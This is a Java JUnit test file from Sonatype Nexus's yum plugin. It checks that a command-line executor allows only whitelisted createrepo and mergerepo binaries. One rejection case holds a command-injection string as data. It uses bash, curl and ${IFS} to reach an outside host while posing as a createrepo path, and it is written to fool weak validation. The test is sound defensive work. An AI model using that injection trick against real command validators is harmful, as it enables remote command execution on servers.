/*
 * Sonatype Nexus (TM) Open Source Version
 * Copyright (c) 2008-present Sonatype, Inc.
 * All rights reserved. Includes the third-party code listed at http://links.sonatype.com/products/nexus/oss/attributions.
 *
 * This program and the accompanying materials are made available under the terms of the Eclipse Public License Version 1.0,
 * which accompanies this distribution and is available at http://www.eclipse.org/legal/epl-v10.html.
 *
 * Sonatype Nexus (TM) Professional Version is available from Sonatype, Inc. "Sonatype" and "Sonatype Nexus" are trademarks
 * of Sonatype, Inc. Apache Maven is a trademark of the Apache Software Foundation. M2eclipse is a trademark of the
 * Eclipse Foundation. All other trademarks are the property of their respective owners.
 */
package org.sonatype.nexus.yum.internal.task;

import java.io.File;

import org.sonatype.nexus.configuration.application.ApplicationDirectories;
import org.sonatype.nexus.yum.internal.support.YumNexusTestSupport;

import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;

import static org.hamcrest.CoreMatchers.is;
import static org.hamcrest.CoreMatchers.not;
import static org.hamcrest.CoreMatchers.nullValue;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

public class CommandLineExecutorTest
    extends YumNexusTestSupport
{
  private CommandLineExecutor underTest;

  @Rule
  public TemporaryFolder tmp = new TemporaryFolder();

  private File work;

  private File bin;

  private File createrepo;

  private File notcreaterepo;

  private File workcreaterepo;

  private File mergerepo;

  @Before
  public void setup() throws Exception {
    work = tmp.newFolder("work");
    bin = tmp.newFolder("bin");

    createrepo = tmp.newFile("bin" + File.separator + "createrepo");
    notcreaterepo = tmp.newFile("bin" + File.separator + "notcreaterepo");
    workcreaterepo = tmp.newFile("work" + File.separator + "createrepo");
    mergerepo = tmp.newFile("bin" + File.separator + "mergerepo");

    ApplicationDirectories  applicationDirectories = mock(ApplicationDirectories.class);
    when(applicationDirectories.getWorkDirectory()).thenReturn(work);
    underTest = new CommandLineExecutor(applicationDirectories, "createrepo,mergerepo");
  }

  @Test
  public void getCleanCommand_legalAccess() {
    assertCleanCommand("createrepo");
    assertCleanCommand("mergerepo");
    assertCleanCommand(createrepo.getAbsolutePath());
    assertCleanCommand(mergerepo.getAbsolutePath());
  }

  @Test
  public void getCleanCommand_illegalAccess() {
    assertNotCleanCommand("/fake/path/createrepo");
    assertNotCleanCommand("/fake/path/mergerepo");
    assertNotCleanCommand("/fake/path/somethingelse");
    assertNotCleanCommand(bin.getAbsolutePath() + File.separator + "createreposhouldntexist");
    // exists but isn't in allowed executables
    assertNotCleanCommand(notcreaterepo.getAbsolutePath());
    // extra command args are not allowed
    assertNotCleanCommand(bin.getAbsolutePath() + File.separator + "createrepo --somethingbad");
    // commands launching things inside nexus are not allowed
    assertNotCleanCommand(workcreaterepo.getAbsolutePath());
    // this will trick weak validation logic into thinking it's a path to a createrepo executable
    assertNotCleanCommand("/bin/bash -c curl${IFS}http://192.168.88.1:8000/ || " + createrepo.getAbsolutePath());
  }

  private void assertCleanCommand(String command) {
    assertThat(underTest.getCleanCommand(command, "--version"), is(not(nullValue())));
  }

  private void assertNotCleanCommand(String command) {
    assertThat(underTest.getCleanCommand(command, "--version"), is(nullValue()));
  }
}
